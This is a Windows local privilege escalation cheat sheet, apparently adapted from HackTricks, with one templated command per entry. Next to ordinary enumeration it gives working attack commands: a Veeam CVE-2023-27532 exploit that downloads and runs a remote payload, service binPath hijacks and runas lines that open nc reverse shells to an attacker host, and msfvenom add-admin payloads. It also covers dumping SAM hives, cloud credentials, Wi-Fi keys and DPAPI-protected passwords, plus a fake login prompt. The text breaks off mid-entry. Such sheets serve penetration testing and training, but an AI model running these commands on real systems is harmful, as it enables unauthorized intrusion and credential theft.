# Windows LPE

Windows local privilege escalation cheats. Sourced from HackTricks; one entry per command. Variables (`$user`, `$pass`, `$service`, `$proc_name`, `$ssid`, etc.) prompt at runtime; `$lhost` and `$lport` come from `common.md` (`tun_ip`, `lports`).

## System Info

### OS version (powershell)

```powershell title:"Get current OS version object via [Environment]"
[System.Environment]::OSVersion.Version
```
<!-- cheat -->

### patches (powershell)

```powershell title:"List all installed hotfix IDs via WMI"
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
```
<!-- cheat -->

### security patches only

```powershell title:"Filter Get-Hotfix to security updates only"
Get-Hotfix -description "Security update"
```
<!-- cheat -->

### env vars (powershell)

```powershell title:"Dump all environment variables in PowerShell"
Get-ChildItem Env: | ft Key,Value -AutoSize
```
<!-- cheat -->

### PS history (current user)

```cmd title:"Read PSReadline history file via type"
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
<!-- cheat -->

### PS history (env)

```powershell title:"Read PSReadline history using $env:APPDATA"
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
<!-- cheat -->

### PS history path

```powershell title:"Locate the active PSReadline history file"
cat (Get-PSReadlineOption).HistorySavePath
```
<!-- cheat -->

### grep PS history for passwords

```powershell title:"Search PSReadline history for password mentions"
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
<!-- cheat -->

### Transcription policy (HKCU)

```cmd title:"Check user-level PowerShell transcription policy"
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```
<!-- cheat -->

### Transcription policy (HKLM)

```cmd title:"Check machine-level PowerShell transcription policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```
<!-- cheat -->

### transcript directory

```cmd title:"List the configured PowerShell transcript directory"
dir C:\Transcripts
```
<!-- cheat -->

### start transcript

```powershell title:"Start a PowerShell transcript to file"
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
```
<!-- cheat -->

### Module Logging policy (HKCU)

```cmd title:"Check user-level PowerShell module logging policy"
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
<!-- cheat -->

### Module Logging policy (HKLM)

```cmd title:"Check machine-level PowerShell module logging policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
<!-- cheat -->

### last 15 PS log events

```powershell title:"Show last 15 entries from Windows PowerShell event log"
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
<!-- cheat -->

### Script Block Logging policy (HKCU)

```cmd title:"Check user-level script-block logging policy"
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
<!-- cheat -->

### Script Block Logging policy (HKLM)

```cmd title:"Check machine-level script-block logging policy"
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
<!-- cheat -->

### last 20 PS operational events

```powershell title:"Show last 20 entries from PowerShell Operational log"
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
<!-- cheat -->

### Internet Settings (HKCU)

```cmd title:"Read user-level Internet Settings registry"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
<!-- cheat -->

### Internet Settings (HKLM)

```cmd title:"Read machine-level Internet Settings registry"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
<!-- cheat -->

### drives (cmd)

```cmd title:"List logical drives via WMIC"
wmic logicaldisk get caption,description,providername
```
<!-- cheat -->

### drives (powershell)

```powershell title:"List filesystem drives via Get-PSDrive"
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | ft Name,Root
```
<!-- cheat -->

## WSUS

### WSUS server (cmd)

```cmd title:"Read configured WSUS server URL from registry"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
<!-- cheat -->

### WSUS server (powershell)

```powershell title:"Read WSUS server URL via Get-ItemProperty"
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
<!-- cheat -->

## Veeam Backup & Replication CVE-2023-27532

### TCP 9401 listener

```cmd title:"Confirm Veeam B&R RPC service is listening on TCP/9401"
netstat -ano | findstr 9401
```
<!-- cheat -->

### Veeam B&R version

```powershell title:"Read Veeam.Backup.Shell.exe FileVersion to confirm CVE-2023-27532 reach"
(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion
```
<!-- cheat -->

### exploit

```cmd title:"Trigger SYSTEM payload through VeeamHax PoC over local socket"
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr $scheme://$lhost:$lport/$file -usebasicparsing)\""
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## AlwaysInstallElevated

### check (HKCU)

```cmd title:"Check user-level AlwaysInstallElevated policy"
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
<!-- cheat -->

### check (HKLM)

```cmd title:"Check machine-level AlwaysInstallElevated policy"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
<!-- cheat -->

### MSI payload (no-uac format)

```cmd title:"Build adduser MSI in msi-nouac format"
msfvenom -p windows/adduser USER=$user PASS=$pass -f msi-nouac -o alwe.msi
```
<!-- cheat
var user
var pass
-->

### MSI payload (standard)

```cmd title:"Build standard adduser MSI (msiexec bypasses UAC)"
msfvenom -p windows/adduser USER=$user PASS=$pass -f msi -o alwe.msi
```
<!-- cheat
var user
var pass
-->

### PowerUp MSI

```powershell title:"Drop a user-add MSI in CWD via PowerUp Write-UserAddMSI"
Write-UserAddMSI
```
<!-- cheat -->

### install MSI silently

```cmd title:"Install MSI quietly (triggers AlwaysInstallElevated SYSTEM exec)"
msiexec /quiet /qn /i $msi_path
```
<!-- cheat
var msi_path
-->

## Antivirus and Detectors

### audit policy

```cmd title:"Read Audit policy registry to see what's being logged"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
<!-- cheat -->

### Windows Event Forwarding

```cmd title:"Check WEF SubscriptionManager for log-forwarding target"
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
<!-- cheat -->

### WDigest

```cmd title:"Check if WDigest is caching plaintext passwords in LSASS"
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
<!-- cheat -->

### LSA Protection

```cmd title:"Check RunAsPPL flag (LSA Protection) on this host"
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
<!-- cheat -->

### Credential Guard

```cmd title:"Check LsaCfgFlags to see if Credential Guard is on"
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
<!-- cheat -->

### cached logons

```cmd title:"Read cached logon count from Winlogon registry"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT
```
<!-- cheat -->

## Users & Groups

### whoami

```cmd title:"Show current user info via net users"
net users %username%
```
<!-- cheat -->

### local users (WMI)

```powershell title:"Enumerate local users via Win32_UserAccount WMI class"
Get-WmiObject -Class Win32_UserAccount
```
<!-- cheat -->

### local users (with last logon)

```powershell title:"List local users with enabled flag and last logon time"
Get-LocalUser | ft Name,Enabled,LastLogon
```
<!-- cheat -->

### user home dirs

```powershell title:"List user profile directories under C:\Users"
Get-ChildItem C:\Users -Force | select Name
```
<!-- cheat -->

### Administrators members (powershell)

```powershell title:"List Administrators group members via Get-LocalGroupMember"
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
<!-- cheat -->

### sessions (qwinsta)

```cmd title:"List interactive logon sessions on this host"
qwinsta
```
<!-- cheat -->

### Kerberos sessions

```cmd title:"List active Kerberos sessions for the current user"
klist sessions
```
<!-- cheat -->

### user home dirs (cmd)

```cmd title:"List C:\Users contents to enumerate profile dirs"
dir C:\Users
```
<!-- cheat -->

### clipboard

```powershell title:"Read current clipboard contents"
powershell -command "Get-Clipboard"
```
<!-- cheat -->

## Running Processes

### processes with services

```cmd title:"List running processes with associated services"
Tasklist /SVC
```
<!-- cheat -->

### SYSTEM processes

```cmd title:"List processes running as NT AUTHORITY\SYSTEM"
tasklist /v /fi "username eq system"
```
<!-- cheat -->

### non-svchost processes (WMI)

```powershell title:"Enumerate non-svchost processes with owner via WMI"
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```
<!-- cheat -->

### non-svchost processes

```powershell title:"List non-svchost processes via Get-Process"
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
<!-- cheat -->

### process binary ACLs

```cmd title:"Find non-system process binaries the current user can write"
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
    for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
        icacls "%%z" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
    )
)
```
<!-- cheat -->

### process folder ACLs (DLL hijack)

```cmd title:"Find non-system process folders writable by current user (DLL hijack)"
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
    icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
```
<!-- cheat -->

### memory dump (procdump)

```cmd title:"Dump process memory with procdump for offline cred mining"
procdump.exe -accepteula -ma $proc_name
```
<!-- cheat
var proc_name
-->

## Services

### list (sc)

```cmd title:"List all services via sc query"
sc query
```
<!-- cheat -->

### list (powershell)

```powershell title:"List all services via Get-Service"
Get-Service
```
<!-- cheat -->

### service config

```cmd title:"Show service binary path, account, and dependencies"
sc qc $service
```
<!-- cheat
var service
-->

### service rights (specific)

```cmd title:"Check current user's rights on a specific service"
accesschk.exe -ucqv $service
```
<!-- cheat
var service
-->

### writable services (Authenticated Users)

```cmd title:"Find services Authenticated Users can modify"
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
<!-- cheat -->

### writable services (current user)

```cmd title:"Find services current user can modify"
accesschk.exe -uwcqv %USERNAME% * /accepteula
```
<!-- cheat -->

### writable services (BUILTIN\Users)

```cmd title:"Find services BUILTIN\Users group can modify"
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```
<!-- cheat -->

### enable a service

```cmd title:"Set start type to demand on a disabled service"
sc config $service start= demand
```
<!-- cheat
var service
-->

### service runs as LocalSystem

```cmd title:"Reconfigure service to run as LocalSystem with empty password"
sc config $service obj= ".\LocalSystem" password= ""
```
<!-- cheat
var service
-->

### service auto-start

```cmd title:"Set a service to start automatically at boot"
sc.exe config $service start= auto
```
<!-- cheat
var service
-->

### binPath hijack (nc reverse shell)

```cmd title:"Hijack service binPath to launch nc reverse shell"
sc config $service binpath= "C:\nc.exe -nv $lhost $lport -e C:\WINDOWS\System32\cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var service
-->

### binPath hijack (add admin)

```cmd title:"Hijack service binPath to add user to local Administrators"
sc config $service binpath= "net localgroup administrators $user /add"
```
<!-- cheat
var service
var user
-->

### binPath hijack (cmd /c reverse)

```cmd title:"Hijack service binPath to run cmd /c with nc reverse shell"
sc config $service binpath= "cmd /c C:\Users\nc.exe $lhost $lport -e cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var service
-->

### restart (wmic)

```cmd title:"Restart a service via WMIC StartService method"
wmic service $service call startservice
```
<!-- cheat
var service
-->

### restart (net)

```cmd title:"Stop and start a service via net commands"
net stop $service && net start $service
```
<!-- cheat
var service
-->

### weak service binary perms

```cmd title:"Find services whose binary has weak file ACLs"
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
<!-- cheat -->

### service registry write check

```cmd title:"Test write access to every service registry key via reg save/restore"
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
```
<!-- cheat -->

### list ImagePaths

```cmd title:"Dump every service's ImagePath registry value"
reg query hklm\System\CurrentControlSet\Services /s /v imagepath
```
<!-- cheat -->

### service registry ACLs

```powershell title:"Check ACLs on service registry keys for writable principals"
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "$user Users Path Everyone"
```
<!-- cheat
var user
-->

### overwrite ImagePath (reg add)

```cmd title:"Overwrite a service's ImagePath via reg add"
reg add HKLM\SYSTEM\CurrentControlSet\services\$service /v ImagePath /t REG_EXPAND_SZ /d $binary_path /f
```
<!-- cheat
var service
var binary_path
-->

### unquoted paths (cmd, auto)

```cmd title:"Find auto-start services with unquoted paths outside C:\Windows"
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```
<!-- cheat -->

### unquoted paths (cmd, any)

```cmd title:"Find any-start-type services with unquoted paths outside C:\Windows\system32"
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'
```
<!-- cheat -->

### unquoted paths (PowerUp)

```powershell title:"Find unquoted service paths via PowerUp Get-ServiceUnquoted"
Get-ServiceUnquoted -Verbose
```
<!-- cheat -->

### unquoted paths (powershell WMI)

```powershell title:"Find unquoted auto-start services via Get-WmiObject"
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
<!-- cheat -->

### service exe payload

```cmd title:"Generate service-format adduser exe payload via msfvenom"
msfvenom -p windows/exec CMD="net localgroup administrators $user /add" -f exe-service -o service.exe
```
<!-- cheat
var user
-->

## Applications

### Program Files (64-bit)

```cmd title:"List installed apps under C:\Program Files"
dir /a "C:\Program Files"
```
<!-- cheat -->

### Program Files (x86)

```cmd title:"List installed apps under C:\Program Files (x86)"
dir /a "C:\Program Files (x86)"
```
<!-- cheat -->

### installed software (registry)

```cmd title:"List installed software via HKLM\SOFTWARE registry"
reg query HKLM\SOFTWARE
```
<!-- cheat -->

### Program Files (powershell, with timestamps)

```powershell title:"List Program Files with last write times via Get-ChildItem"
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
```
<!-- cheat -->

### installed software (powershell registry)

```powershell title:"List installed software via Registry::HKLM\SOFTWARE"
Get-ChildItem -path Registry::HKLM\SOFTWARE | ft Name
```
<!-- cheat -->

### writable dirs (Users)

```cmd title:"Find Users-writable directories under C:\"
accesschk.exe -uwdqs Users c:\
```
<!-- cheat -->

### writable dirs (Authenticated Users)

```cmd title:"Find Authenticated-Users-writable directories under C:\"
accesschk.exe -uwdqs "Authenticated Users" c:\
```
<!-- cheat -->

### writable dirs (Everyone)

```cmd title:"Find Everyone-writable directories under C:\"
accesschk.exe -uwdqs "Everyone" c:\
```
<!-- cheat -->

### writable files (Users)

```cmd title:"Find Users-writable files under C:\"
accesschk.exe -uwqs Users c:\*.*
```
<!-- cheat -->

### Program Files ACL check

```cmd title:"Check Program Files ACLs for write access by current user"
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
```
<!-- cheat -->

### Everyone-writable in Program Files

```powershell title:"Find Program Files items with Everyone ACE via Get-Acl"
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
```
<!-- cheat -->

### Users-writable in Program Files

```powershell title:"Find Program Files items with BUILTIN\Users ACE via Get-Acl"
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
<!-- cheat -->

### loaded drivers

```cmd title:"List loaded drivers via driverquery"
driverquery
```
<!-- cheat -->

### drivers (table)

```cmd title:"List drivers in table format"
driverquery.exe /fo table
```
<!-- cheat -->

### signed drivers

```cmd title:"List signed driver info via driverquery /SI"
driverquery /SI
```
<!-- cheat -->

## PATH DLL Hijacking

### writable PATH dirs

```cmd title:"Find writable directories in %PATH% (DLL planting target)"
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
<!-- cheat -->

## Network

### shares (domain)

```cmd title:"List shares across a domain via net view"
net view /all /domain $domain
```
<!-- cheat
var domain
-->

### shares (remote host)

```cmd title:"List shares on a specific remote host"
net view \\$host /ALL
```
<!-- cheat
var host
-->

### mount share

```cmd title:"Mount a remote share to drive X:"
net use x: \\$host\$share
```
<!-- cheat
var host
var share
-->

### hosts file

```cmd title:"Read the Windows hosts file"
type C:\Windows\System32\drivers\etc\hosts
```
<!-- cheat -->

### interfaces (powershell)

```powershell title:"Show interface IPs via Get-NetIPConfiguration"
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
```
<!-- cheat -->

### DNS servers

```powershell title:"Show DNS servers via Get-DnsClientServerAddress"
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
<!-- cheat -->

### routes (powershell)

```powershell title:"Show IPv4 routes via Get-NetRoute"
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
<!-- cheat -->

### ARP table (cmd)

```cmd title:"Show ARP table via arp -A"
arp -A
```
<!-- cheat -->

### ARP table (powershell)

```powershell title:"Show ARP neighbors via Get-NetNeighbor"
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
<!-- cheat -->

### WSL bash

```cmd title:"Launch WSL bash shell"
C:\Windows\System32\bash.exe
```
<!-- cheat -->

### WSL run

```cmd title:"Run a single command in the default WSL distro"
wsl whoami
```
<!-- cheat -->

### WSL default user root

```cmd title:"Set a WSL distro's default user to root"
./ubuntun1604.exe config --default-user root
```
<!-- cheat -->

### WSL python pivot

```cmd title:"Run Python payload through WSL (cross-subsystem pivot)"
wsl python -c '$payload'
```
<!-- cheat
var payload
-->

## Windows Credentials

### Winlogon registry dump

```cmd title:"Dump all Winlogon credential-bearing values via findstr"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```
<!-- cheat -->

### Winlogon DefaultUserName

```cmd title:"Read Winlogon DefaultUserName value"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```
<!-- cheat -->

### Winlogon DefaultPassword

```cmd title:"Read Winlogon DefaultPassword value (autologon plaintext)"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
<!-- cheat -->

### runas /savecred

```cmd title:"Run remote binary using saved Credential Manager creds"
runas /savecred /user:$user "\\$host\$share\$file"
```
<!-- cheat
var user
var host
var share
var file
-->

### runas with creds

```cmd title:"Run command as another user with explicit creds"
C:\Windows\System32\runas.exe /env /noprofile /user:$user $pass "c:\users\Public\nc.exe -nc $lhost $lport -e cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var user
var pass
-->

### DPAPI master keys (Roaming)

```powershell title:"List DPAPI master keys in roaming AppData"
Get-ChildItem $env:APPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI master keys (Local)

```powershell title:"List DPAPI master keys in local AppData"
Get-ChildItem $env:LOCALAPPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI cred blobs (Local)

```powershell title:"List DPAPI credential blobs in local AppData"
Get-ChildItem -Hidden $env:LOCALAPPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### DPAPI cred blobs (Roaming)

```powershell title:"List DPAPI credential blobs in roaming AppData"
Get-ChildItem -Hidden $env:APPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### decrypt PS credential file

```powershell title:"Decrypt Import-Clixml PSCredential file and reveal plaintext"
$credential = Import-Clixml -Path $cred_file; $credential.GetNetworkCredential() | fl
```
<!-- cheat
var cred_file
-->

### Wi-Fi profiles

```cmd title:"List saved Wi-Fi profiles via netsh"
netsh wlan show profile
```
<!-- cheat -->

### Wi-Fi password

```cmd title:"Reveal cleartext Wi-Fi password for a specific SSID"
netsh wlan show profile $ssid key=clear
```
<!-- cheat
var ssid
-->

### dump all Wi-Fi passwords

```cmd title:"Iterate every Wi-Fi profile and dump cleartext passwords"
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
<!-- cheat -->

### RunMRU

```cmd title:"Read RunMRU recent commands from explorer"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```
<!-- cheat -->

### RDCMan settings

```cmd title:"Read RDCMan settings file with stored RDP creds"
type %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
<!-- cheat -->

### IIS appcmd cred dump (PowerUp)

```powershell title:"Dump IIS app pool and vdir credentials via appcmd (PowerUp)"
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        $DataTable = New-Object System.Data.DataTable
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
            $PoolName = $_
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
            $VdirName = $_
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        if( $DataTable.rows.Count -gt 0 ) {
            $DataTable | Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else { Write-Verbose 'No application pool or virtual directory passwords were found.'; $False }
    }
    else { Write-Verbose 'Appcmd.exe does not exist in the default location.'; $False }
    $ErrorActionPreference = $OrigError
}
```
<!-- cheat -->

### SCCM apps

```powershell title:"List installed SCCM applications via WMI"
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion; if ($result) { $result } else { Write "Not Installed." }
```
<!-- cheat -->

## Files and Registry (Credentials)

### PuTTY sessions

```cmd title:"Search PuTTY session registry for credentials and proxy info"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
```
<!-- cheat -->

### PuTTY host keys

```cmd title:"List PuTTY-cached SSH host keys"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
<!-- cheat -->

### OpenSSH agent keys

```cmd title:"Read OpenSSH agent keys from registry"
reg query HKCU\Software\OpenSSH\Agent\Keys
```
<!-- cheat -->

### enable ssh-agent

```powershell title:"Set ssh-agent to auto-start and start the service"
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
<!-- cheat -->

### find unattended files

```cmd title:"Recursively find unattended/sysprep files on C:\"
dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattended.xml C:\*unattend.xml C:\*unattend.txt 2>nul
```
<!-- cheat -->

### read unattended files

```cmd title:"Read every known unattended/sysprep credential file"
for %f in ("C:\Windows\sysprep\sysprep.xml" "C:\Windows\sysprep\sysprep.inf" "C:\Windows\sysprep.inf" "C:\Windows\Panther\Unattended.xml" "C:\Windows\Panther\Unattend.xml" "C:\Windows\Panther\Unattend\Unattend.xml" "C:\Windows\Panther\Unattend\Unattended.xml" "C:\Windows\System32\Sysprep\unattend.xml" "C:\Windows\System32\Sysprep\unattended.xml" "C:\unattend.txt" "C:\unattend.inf") do @if exist %f echo === %f === & type %f
```
<!-- cheat -->

### copy SAM/SYSTEM backups

```cmd title:"Copy SAM and SYSTEM hive backups to loot dir if accessible"
for %f in ("%SYSTEMROOT%\repair\SAM" "%SYSTEMROOT%\System32\config\RegBack\SAM" "%SYSTEMROOT%\System32\config\SAM" "%SYSTEMROOT%\repair\system" "%SYSTEMROOT%\System32\config\SYSTEM" "%SYSTEMROOT%\System32\config\RegBack\system") do @if exist %f copy %f $loot_dir\
```
<!-- cheat
var loot_dir
-->

### reg save hives (admin)

```cmd title:"Save SAM/SYSTEM/SECURITY hives via reg save (requires admin)"
reg save HKLM\SAM $loot_dir\sam.hive & reg save HKLM\SYSTEM $loot_dir\system.hive & reg save HKLM\SECURITY $loot_dir\security.hive
```
<!-- cheat
var loot_dir
-->

### read cloud creds

```cmd title:"Read AWS/GCP/Azure credential files from common locations"
for %f in ("%USERPROFILE%\.aws\credentials" "%APPDATA%\gcloud\credentials.db" "%APPDATA%\gcloud\legacy_credentials" "%APPDATA%\gcloud\access_tokens.db" "%USERPROFILE%\.azure\accessTokens.json" "%USERPROFILE%\.azure\azureProfile.json") do @if exist %f echo === %f === & type %f
```
<!-- cheat -->

### gpp-decrypt

```cmd title:"Decrypt cached Group Policy Preferences cpassword value"
gpp-decrypt $cpassword
```
<!-- cheat
var cpassword
-->

### find IIS web.config

```powershell title:"Recursively find web.config under C:\inetpub"
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### IIS connectionString

```cmd title:"Read .NET machine.config and grep for connectionString"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
<!-- cheat -->

### find XAMPP web.config

```powershell title:"Recursively find web.config under C:\xampp"
Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### OpenVPN GUI creds

```powershell title:"Decrypt OpenVPN GUI saved credentials via DPAPI"
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
foreach ($item in $items) {
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]
  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes, $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
<!-- cheat -->

### IIS logs

```cmd title:"List IIS log files"
dir C:\inetpub\logs\LogFiles\
```
<!-- cheat -->

### find webserver logs

```powershell title:"Find access.log/error.log under C:\ recursively"
Get-Childitem -Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### prompt for creds

```powershell title:"Pop a fake credential prompt and reveal the entered plaintext"
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
```
<!-- cheat -->

### find credential files

```cmd title:"Search C:\ for known credential-bearing filenames"
